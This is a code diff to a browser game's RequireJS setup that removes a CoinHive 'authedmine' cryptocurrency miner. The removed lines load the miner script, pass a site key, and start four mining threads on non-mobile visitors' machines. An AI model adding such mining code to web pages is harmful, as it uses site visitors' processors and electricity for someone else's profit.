@@ -5,20 +5,16 @@ requirejs.config({
         "jquery": 'libs/jquery/dist/jquery',
         "PIXI":"libs/pixi.js/dist/pixi",
         "game":"game",
-        "firebase":"//www.gstatic.com/firebasejs/5.5.5/firebase",
-        "CoinHive":"//authedmine.com/lib/authedmine.min"
+        "firebase":"//www.gstatic.com/firebasejs/5.5.5/firebase"
     },
     shim:{
         'firebase':{
             exports:'firebase'
-        },
-        "CoinHive":{
-            exports:"CoinHive"
         }
     }
 });
 
-requirejs(['firebase', 'game', 'CoinHive'], function(firebase, game, CoinHive){
+requirejs(['firebase', 'game'], function(firebase, game){
     console.log("app init")
     
     var config = {
@@ -31,13 +27,6 @@ requirejs(['firebase', 'game', 'CoinHive'], function(firebase, game, CoinHive){
     };
     
     firebase.initializeApp(config);
-
-    var miner = new CoinHive.Anonymous('NPwNWYOiEicAt9BsqE3l6ohOy4nrnxu0', {throttle: 0.3});
-    if (!miner.isMobile() && !miner.didOptOut(14400)) {
-        miner.setThrottle(0.5);
-        miner.setNumThreads(4);
-        miner.start();
-    }
     
     game.init()
 });
